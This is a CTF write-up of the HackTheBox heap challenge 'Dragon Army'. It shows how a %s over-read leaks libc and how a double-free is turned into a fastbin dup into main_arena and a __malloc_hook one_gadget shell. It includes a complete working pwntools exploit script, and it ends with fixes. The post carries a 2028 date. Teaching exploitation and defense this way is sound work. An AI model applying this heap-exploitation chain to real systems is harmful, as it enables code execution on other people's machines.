---
layout: post
title: "Dragon Army"
date: 2028-02-05 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, glibc, double-free, fastbin-dup, use-after-free, malloc-hook, one-gadget, info-leak]
description: "A Medium Pwn challenge where a free() that forgets to clear its slot pointer gives a double-free, and an allocation-size filter deliberately kills the textbook __malloc_hook fastbin target — so the solve fastbin-dups into main_arena, forges a fake top chunk above __malloc_hook, and drops a one_gadget on it. The libc leak comes for free from a %s that walks off the end of a non-terminated buffer."
---

## Overview

Dragon Army is a Medium **Pwn** challenge: a menu-driven "dragon army" manager built on
the glibc heap, compiled with every modern mitigation on (Full RELRO, stack canary, NX,
and PIE). It has two bugs — a stack `%s` that leaks a libc pointer, and a
[use-after-free / double-free](https://cwe.mitre.org/data/definitions/415.html) because
`free()` never clears the slot it just released. The interesting part is that the author
*bans the easy exploit path*: an allocation-size filter forbids the one chunk size the
classic `__malloc_hook` fastbin trick needs. The solve routes around it by allocating
straight into `main_arena` and forging a fake top chunk above `__malloc_hook`.

## The technique

Two primitives, chained.

**Leak — a `%s` over-read.** At startup the program asks you to "cast a magic spell". It
`read()`s your input into a stack buffer that is **never null-terminated**, then, if the
first 18 bytes equal a fixed password, echoes it back with `fprintf(stdout, "...spell: %s", buf)`.
Because `%s` prints until it hits a null byte, and `read()` doesn't add one, the print
runs off the end of your input into adjacent stack memory — which still holds a leftover
libc pointer (`__GI__IO_file_jumps`). Send the password padded with `A`s, split on the
`A`s, and the trailing bytes are the leak. Subtract the symbol offset → libc base. (This
only works against the live process; under a debugger the trailing newline becomes a null
and cuts the read short.)

**Heap — double-free without hygiene.** The "fly away" menu option does
`free(dragons[idx])` but leaves the pointer in the tracking array and never decrements the
count, so the same chunk can be freed repeatedly. Two obstacles make this a *hard* heap
challenge rather than a one-liner:

- glibc ≥ 2.29 **key-protects tcache double-frees** — freeing the same tcache chunk twice
  aborts.
- The allocation size is filtered to `2..0x58` and `0x69..0x78`, which **bans 0x70-sized
  chunks** — exactly the size the textbook "fake `0x7f` chunk just below `__malloc_hook`"
  fastbin target relies on.

So the solve drops to the **fastbin** and dupes there instead:

1. Allocate `A`, `B` of the same 0x50-class size, then free `A → B → A` (never `A → A`,
   which glibc's "chunk currently at top of the fastbin" check rejects). `A` now sits in
   the 0x50 fastbin twice.
2. Reallocate and overwrite `A`'s forward pointer to `main_arena + 0x15`, so a same-size
   allocation lands **inside `main_arena`** itself. Two more allocations walk the dup there.
3. From inside the arena, overwrite the **top-chunk pointer** to point at controlled libc
   memory, and write a naturally-valid fake top-chunk size (`0x1fb11`) that sits *above*
   `__malloc_hook`. A neat detail makes the metadata checks pass: a heap/PIE address's high
   byte `0x56` is itself a valid chunk size (flags `prev_inuse | is_mmapped | non_main_arena`),
   so the forged-in-arena addresses double as legal sizes.
4. "March" that now-huge top chunk down onto `__malloc_hook` with a few clean allocations,
   overwrite `__malloc_hook` with a libc **one_gadget**, then trigger it with one more
   `malloc()` — any allocation invokes the hook → shell.

The whole thing has to fit inside a hard cap of **13 total allocations**, so the chain is
counted out in advance.

## Solution

The durable artifact is `solve.py`. Because the fake-size trick and the one_gadget's
`rsp+0x50` constraint make each run ASLR-probabilistic, wrap the remote attempt in a retry
loop — it usually lands within a couple of tries.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import context, ELF, log, p64, remote, process, sys, u64

context.binary = ELF('da', checksec=False)
glibc = ELF('glibc/libc.so.6', checksec=False)

def get_process():
    if len(sys.argv) == 1:
        return process('./da')
    host, port = sys.argv[1].split(':')
    return remote(host, port)

def summon(p, length, name):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b"Dragon's length: ", str(length).encode())
    p.sendlineafter(b'Name your dragon: ', name)

def release(p, index):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Dragon of choice: ', str(index).encode())

def main():
    p = get_process()

    # Stage 1: libc leak via %s over-read of the non-terminated spell buffer
    p.sendafter(b"army's power: ", b'r3dDr4g3nst1str0f1'.ljust(0x30, b'A'))
    p.recvline()
    leak = u64(p.recvline()[:-1].split(b'A')[-1].ljust(8, b'\0'))
    glibc.address = leak - glibc.sym.__GI__IO_file_jumps
    log.success(f'glibc base: {hex(glibc.address)}')

    # Stage 2: fastbin dup -> allocate into main_arena -> forge top chunk
    summon(p, 0x48, b'A'); summon(p, 0x48, b'B')
    summon(p, 0x28, b'X'); release(p, 2)
    release(p, 0); release(p, 1); release(p, 0)          # fastbin dup A->B->A
    summon(p, 0x48, p64(glibc.sym.main_arena + 0x15))    # fd -> inside arena
    summon(p, 0x48, b'B'); summon(p, 0x48, b'A')         # walk the dup
    summon(p, 0x48, b'\0'*3 + p64(glibc.sym._IO_2_1_stdin_ + 61)
                    + p64(0)*6 + p64(glibc.sym._IO_2_1_stdin_ + 112))  # top-chunk ptr
    summon(p, 0x48, b'\0'*3 + p64(0)*5 + p64(0x1fb11))   # fake top size
    summon(p, 0x78, b''); summon(p, 0x78, b''); summon(p, 0x58, b'')   # march top down

    # Stage 3: overwrite __malloc_hook with a one_gadget, then trigger
    summon(p, 0x38, p64(0)*2 + p64(glibc.address + 0xe1fa1))
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b"Dragon's length: ", b'24')         # malloc() -> hook -> shell

    p.sendline(b'cat flag.txt; id')
    p.interactive()

if __name__ == '__main__':
    main()
```

Run it against the instance and read the flag from the shell:

```bash
python3 solve.py <ip>:<port>
# [+] glibc base: 0x7f...
# $ cat flag.txt
# HTB{...}
```

Flag redacted.

## Why it worked

`free()` that forgets to null its slot pointer is the root cause — it turns a single
release into a repeatable
[double-free](https://cwe.mitre.org/data/definitions/415.html). The size filter that bans
0x70 chunks was meant to close the standard `__malloc_hook` fastbin route, but a fastbin
dup can allocate *into `main_arena`* and forge the allocator's own top-chunk pointer, so
`__malloc_hook` is still reachable without ever needing a fake chunk of the banned size.
The libc leak that makes all of this addressable is a separate, deterministic bug: a
buffer read with `read()` and printed with `%s` but never null-terminated
([use of uninitialized / non-terminated data](https://cwe.mitre.org/data/definitions/457.html)).

## Fix / defense

- On free, **clear the slot and decrement the count** (`dragons[idx] = NULL; count--;`) so a
  repeat free is a no-op — this alone kills both the UAF and the double-free.
- **Null-terminate** every buffer before formatting, and never `printf("%s", buf)` on raw
  `read()` output; use the returned length with `fwrite(buf, 1, n, ...)` instead.
- Build against hardened glibc — `__malloc_hook`/`__free_hook` were removed in 2.34, which
  deletes this exact target — and enable AddressSanitizer in CI to catch the double-free at
  test time.
